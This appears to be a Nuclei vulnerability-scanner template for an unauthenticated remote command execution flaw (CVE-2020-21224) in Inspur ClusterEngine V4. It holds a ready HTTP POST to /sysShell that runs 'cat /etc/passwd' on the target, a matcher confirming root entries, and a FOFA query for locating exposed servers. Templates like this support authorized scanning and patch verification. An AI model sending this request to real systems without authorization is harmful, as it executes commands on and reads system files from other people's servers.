id: inspur-clusterengine-rce

info:
  name: 浪潮(Inspur) Clusterengine V4 SYSshell - 远程命令执行
  author: wintry
  severity: critical
  description: 浪潮(Inspur) Clusterengine V4 SYSshell 远程命令执行.
  reference:
    - https://www.inspursystems.com/
    - https://github.com/MzzdToT/ClusterEngineV4.0sysShell_rce
    - https://nvd.nist.gov/vuln/detail/CVE-2020-21224
    - https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul
  metadata:
    max-request: 1
    fofa-query: title="TSCEV4.0"
  tags: inspur,clusterengine

http:
  - raw:
      - |
        POST /sysShell HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
        Cookie: lang=cn

        op=doPlease&node=cu01&command=cat+/etc/passwd

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
